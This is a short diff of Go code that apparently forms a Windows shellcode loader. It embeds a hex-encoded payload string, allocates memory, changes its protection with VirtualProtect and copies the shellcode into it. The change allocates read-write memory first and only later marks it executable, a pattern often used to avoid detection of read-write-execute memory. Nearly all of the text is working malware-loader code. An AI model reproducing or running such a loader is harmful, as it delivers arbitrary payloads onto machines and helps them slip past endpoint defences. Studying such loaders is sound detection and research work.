@@ -13,6 +13,7 @@ const (
 	MEM_COMMIT             = 0x1000
 	MEM_RESERVE            = 0x2000
 	PAGE_EXECUTE_READ      = 0x20
+	PAGE_READWRITE         = 0x04
 	PAGE_EXECUTE_READWRITE = 0x40
 )
 
@@ -26,14 +27,14 @@ var shellcode string = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50
 func main() {
 
 	// Marking as PAGE_EXECUTE_READ only so that we can demo VirtualProtect
-	addr, err := w32.VirtualAlloc(0, len(shellcode), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+	addr, err := w32.VirtualAlloc(0, len(shellcode), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE)
 	if err != nil {
 		panic(err)
 	}
 
 	var mbi w32.MEMORY_BASIC_INFORMATION
 	w32.VirtualQuery(addr, &mbi, len(shellcode))
-	w32.VirtualProtect(addr, len(shellcode), PAGE_EXECUTE_READWRITE, mbi.Protect)
+	w32.VirtualProtect(addr, len(shellcode), PAGE_EXECUTE_READWRITE, &mbi.Protect)
 
 	buf := (*[890000]byte)(unsafe.Pointer(addr))
 	for x, value := range []byte(shellcode) {
